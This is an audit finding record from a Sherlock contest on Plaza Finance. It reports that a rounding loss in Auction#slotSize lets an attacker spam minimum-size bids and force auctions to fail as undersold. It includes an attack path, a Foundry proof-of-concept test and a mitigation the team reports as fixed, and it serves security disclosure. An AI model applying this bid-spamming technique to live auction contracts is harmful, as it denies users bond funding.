---
# Core Classification
protocol: Plaza Finance
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 49247
audit_firm: Sherlock
contest_link: https://app.sherlock.xyz/audits/contests/682
source_link: none
github_link: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/449

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 5
finders:
  - 0x52
  - moray5554
  - 0xloophole
  - bladeee
  - ZoA
---

## Vulnerability Title

M-7: Rounding loss in Auction#slotSize allows malicious user to force auction to be undersold

### Overview


The bug report discusses an issue in the Plaza Finance platform where a malicious user can manipulate the auction process and cause it to fail, preventing users from funding their bonds. This is due to a precision loss in the calculation of the auction's slot size, which allows the malicious user to spam the auction with bids of a specific size and force it to fail. The report includes a proof of concept and suggests a mitigation to fix the issue. The protocol team has already addressed this issue in their recent updates. 

### Original Finding Content

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/449 

## Found by 
0x52, 0xloophole, ZoA, bladeee, moray5554

### Summary

When an auction reaches the max number of bids it begins rolling the lowest bids off the list. To prevent high price low value bids from spamming out legitimate bids it enforces that the bid is a even division of slotSize(). This protection is not complete due to precision loss in it calculation. If a malicious user spams max number of bids of size == slotSize(), they can force and underfunded auction to occur, DOS'ing users and preventing funding.

### Root Cause

[Auction.sol#L382-L384](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L382-L384) does not account for precision loss allowing it to be exploited

### Internal preconditions

None

### External preconditions

None

### Attack Path

1. Spam max bids at size == slotSize
2. Wait for auction to end
3. End auction in failure
4. Refund all bids

### Impact

Bond payments can be indefinitely DOS'd due to forcing auctions to fail

### POC

Tests for all vulnerabilities can be found [here](https://gist.github.com/IAm0x52/05589415ce45af83aa4f7a5f63afbf45).

Insert the following test into Pool.t.sol

    function testDOSAuction() public {
        //test setup
        Token rToken = Token(params.reserveToken);
        Token cToken = Token(params.couponToken);

        vm.prank(user);
        address auction = Utils.deploy(
        address(new Auction()),
        abi.encodeWithSelector(
            Auction.initialize.selector,
            address(cToken),
            address(rToken),
            5000e6 + 1,
            block.timestamp + 1 days,
            10, // max bids set to 10 for simplicity of the test
            address(this),
            90
        ));

        cToken.mint(user, 1e18);
        cToken.mint(user2, 1e18);

        vm.prank(user);
        cToken.approve(auction, type(uint256).max);

        vm.prank(user2);
        cToken.approve(auction, type(uint256).max);

        vm.prank(user);
        Auction(auction).bid(1e6, 5000e6);
        
        for(uint i=0; i<10; i++){
        vm.prank(user2);
        Auction(auction).bid(0.05e6, 500e6);
        }

        vm.warp(Auction(auction).endTime());

        Auction(auction).endAuction();

        // auction has received a total of 10000e6 worth of bids but still fails due to rounding error
        assert(Auction(auction).state() == Auction.State.FAILED_UNDERSOLD);
    }

    Output:
    [PASS] testDOSAuction()

In the above test the auction receives a total of 10000e6 worth of bids but still fails as UNDERSOLD due to the issue described above.

### Mitigation

slotSize() should be `totalBuyCouponAmount / maxBids + 1` rather than `totalBuyCouponAmount / maxBids`

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/166

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Sherlock |
| Protocol | Plaza Finance |
| Report Date | N/A |
| Finders | 0x52, moray5554, 0xloophole, bladeee, ZoA |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/449
- **Contest**: https://app.sherlock.xyz/audits/contests/682

### Keywords for Search

`vulnerability`

